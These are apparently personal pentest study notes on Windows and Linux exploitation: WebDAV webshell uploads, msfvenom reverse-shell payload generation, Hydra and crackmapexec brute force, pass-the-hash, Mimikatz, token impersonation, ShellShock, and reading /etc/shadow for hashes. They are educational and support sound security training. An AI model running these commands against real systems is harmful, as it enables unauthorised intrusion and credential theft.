  ![[Pasted image 20230821115944.png]]
## Often (mis)configured service exploitation :
### What are frequently exploited windows services ?
#### The services that can be good to exploit are
- Microsoft IIS (Internet Information Service) 
	  Purpose : MS IIS is a server software made by Microsoft that runs on Windows.
- WebDAV (Web Distributed Authoring & Versioning)
	  Purpose : HTTP extension that allows client to update, delete move and copy files on a web server. It's used to enable a web server to act as a file server.
- SMB/CIFS (Server Message Block Protocol)
	  Network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).
- RDP (Remote Desktop Protocol)
	  Proprietary GUI remote access protocol developed by Microsoft and used to remotely authenticate and interact with a Windows system.
- WinRM (Windows Remote Management Protocol)
	  Windows remote management protocol that can be used to facilitate remote access with windows.
### How to exploit them ?
#### Microsoft IIS WebDAV
##### Some more info about it :
- IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
- I can be used to host websites or web apps and provides administrators a robust GUI for managing websites.
- IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP.
- Supported executable file extensions :
	  -  .asp
	  -  .aspx
	  -  .config 
	  -  .php
- WebDAV (often) runs on top MS IIS on ports 80/443 (it can run on Apache)
##### How can we exploit it ?
###### Tools that can be used :
- **DavTest** : Used to scan authenticate and exploit WebDAV server.
- **Cadaver** : Cadaver supports file upload, download, on screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and ressource locking on WebDAV servers.
- **Hydra** : So we can brute force login pages.
- *Note : These will be used in Kali Linux.*
###### Practical things :
###### WebDAV, Cadaver & Hydra
- First, to check if there is some WebDAV running on the remote server you can use the `http-enum` NSE script (with Nmap)
-  Then you can run a bruteforce attack using the following command : `hydra -L [userswordlist] -P [passlist] [targetip] http-get /[pagewithauth]
- You can also check for unauthenticated access to the server with DavTest `davtest -url [targetip]/[webdavpage] 
- If you succeeded to get valid credentials with Hydra so use this command : `davtest -url [targetip]/[webdavpage] -auth [username]:[password]
- To browse into the WebDAV server you can use `cadaver` witch is a tool that is very useful. `cadaver http[s]://[vcip]/[webdavpage]` it will ask you for some credentials, enter them and enjoy it.
- To upload a file to the WebDAV you can use the `put` command in cadaver (after authentification) with `put [path/to/super/webshell]` .
- You can delete a file with the `delete` command, check the help menu for more, do it by using `help` 
###### Metasploit hax
- First generate msfpayload with "msfvenom" using that command : `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[yourip] LPORT=[localport] -f asp -o [urfilename].asp` Note that you can change the payload (-p option)
- Then you must start Metasploit and use the `multi/handler` exploit, use `options` and set the correct options with `set [optname] [newvalue]` 
- To upload your payload you can use Cadaver, or do it with the `exploit/windows/iis/iis_webdav_upload_asp`  that will create a new one, as always you just have to set the correct options to the payload.
- Note : This payload will auto delete the uploaded asp file.

### SMB 
#### Some more info about it :
- SMB Server Message Block is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (printers and serial ports) between computers on a local network.
- SMB uses port  (TCP), Originally, SMB ran on top of NetBIOS using port 139
- SAMBA is the open source Linux implementation of SMB, and allows windows systems to access Linux shares and devices.
##### SMB Authentication
- The SMB protocol utilizes two levels of authentication, namely :
  | - User Authentication
	  - Users must provide a username and a password in order to authenticate with the SMB server in order to access the share.
  | - Share Authentication
	  - Users must provide a password in order to access restricted share.
Note : Both of these authentication levels utilise a challenge response authentication system. 
![[Pasted image 20230831133123.png]]
##### What is PsExec ?
- PsExec is a lightweight telnet-replacement developed by Microsoft that allows you to execute processes on remote windows systems using any user's credentials. 
- Ps Exec uses SMB to authenticate.
- We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
- It is a very similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.
#### SMB exploitation with PsExec
![[Pasted image 20230831133947.png]]
- You **must** have legitimate credentials to perform this attack, you can do bruteforce with metasploit or Hydra.
- Then you can use the following command : `psexec.py [FoudUser]@[target ip]` 
  | Then you will be prompted for the password of _the specified account_.



### RDP (Remote Desktop Protocol ???)
#### Some info about RDP 
![[Pasted image 20230901185445.png]]
#### Exploitation phase
- Bruteforce (hydra)> `hydra -L [UserList] -P [wordlist] rdp://[ipaddres] -s [port]` 
- Connect to the RDP server (xfreerdp)> `xfreerdp /u:[username] /p:[password] /v:[target ip]` 

### WinRM 
#### Info about WinRM
![[Pasted image 20230902180035.png]]
#### Exploiting WinRM
![[Pasted image 20230902180328.png]]
- You can bruteforce WinRM by using crackmapexec with this command : `crackmapexec winrm [targetip] -u [userlist] -p [passlist]`
- To run a command on the remote WinRM system using CMP use : `crackmapexec winrm [targetip] -u [username] -p [password] -x "[commandToBeRunned]"` 

# Windows Privilege escalation :
## Kernel exploits
- Kernel exploits are not to be used often, running code at kernel level is dangerous and can cause system to crash, or get it broken and cause data loss.

## Bypassing UAC (with UACMe)
 ![[Pasted image 20230904122152.png]]![[Pasted image 20230904122716.png]]
- UAC allows a program to run with Administrative privileges, it systematically prompts for the password of an administrator account.
- UACMe GitHub repository : `https://github.com/hfiref0x/UACME`
- Please reefer to GitHub for key usage.

## Access Token Impersonation (Incognito :O)

![[Pasted image 20230904132845.png]]
- To impersonate ATs (Access Tokens) we will use the "Incognito" Metasploit module with :  `load incognito` (run it in Metasploit)
- List ATs to impersonate with `list_tokens -u` 
- Choose and impersonate token with : `impersonate_token "[Token (e.g. VICTIM\User)]"`
- You might encounter problems you can try to solve them by migrating to another process with : `migrate [pid]` 
-

## Alternate Data Stream (Not Twitch)
![[Pasted image 20230905214306.png]]
-

# Windows Credential Dumping
## Windows Password Hashes :
![[Pasted image 20230908205913.png]]![[Pasted image 20230908210120.png]]![[Pasted image 20230908210341.png]]
![[Pasted image 20230908210705.png]]

## The mass windows install Problem :
#### Unattended :
- This file contain passwords in base64 format : `C:/windows/Panther/unattend.xml`
## Dumping Hashes with MIMIKATZ (GentilKiwi) :
![[Pasted image 20230909235629.png]]
- You can use Mimikatz to dump credentials from the lsass.exe process via the Meterpreter plugin or / and the precompiled Mimikatz binary. 
## Pass the Hash attacks
![[Pasted image 20230910124808.png]]
- You can use the PsExec Metasploit module, or Crackmapexec with the following command : `crackmapexec [service (e.g. : smb)] [targetip] -u [username] -H "[hash]" -x "[command]"`


# Linux Powah :
## Frequently exploited Linux services 
![[Pasted image 20230913152759.png]]![[Pasted image 20230913202002.png]]


## Often exploited services / Vulnerabilities (on Linux)
### ShellShock [ #CVE-2014-6271 ]
![[Pasted image 20230913233404.png]]![[Pasted image 20230913233710.png]]
![[Pasted image 20230913233829.png]]
#### Checking the machine :
- to check a CGI script for the ShellShock vulnerability simply use the following command : `nmap --script http-shellshock --script-args “http-shellshock.uri=/[script to check] [vcip]` 
- Then if vulnerable you can take advantage of it using Burp Suite or Metasploit, with Metasploit simply use this exploit : `exploit/multi/http/apache_mod_cgi_bash_env_exec` and set your options correctly.

### FTP Exploitation :
![[Pasted image 20230917055705.png]]
- Find exploits with the version number or simply bruteforce it : `hydra -L [userlist]-P [wordlist] ftp://[vcip]`
### SSH Exploitation :
![[Pasted image 20230917062358.png]]
- Bruteforce it.
### SAMBA Exploitation
![[Pasted image 20230918215620.png]]![[Pasted image 20230918222711.png]]

## Linux PrivEsc :
### Kernel Exploits :
![[Pasted image 20230919221344.png]]
- You first need to compile the Kernel exploit mostly from C to a binary with the `gcc` command, on the TARGET machine : `gcc [exploit.c] -o [binary]`
- Then use `chmod +x [binary]` so you can run it.
### Cron Jobs :
![[Pasted image 20230921181247.png]]
![[Pasted image 20230921181548.png]]
- You can first list the Cron Jobs of the current account (that you are using) with the following command : `crontab -l`
- If you see a file that is recurrently edited, check for files that mentions the file that we're talking about : `grep -nri “[path to file]” /[dir to search on]` and check the output, it may be very interesting.

### Exploiting SUID Binaries :
![[Pasted image 20230923231615.png]]
- Search for SUID bit set binaries using : `find . -perm /4000`
- Use `strings [youbinary]` to check shared objects used or external programs called


## Linux password hash Dumping
![[Pasted image 20230924110247.png]]![[Pasted image 20230924110450.png]]
- you can first try to dump hashes by using the cat utility, just cat out the `/etc/shadow` : `cat /etc/shadow` 
- In metasploit use the hashdump post exploitation module : `post/linux/gather/hashdump`

# The end :
![[Pasted image 20230924114042.png]]


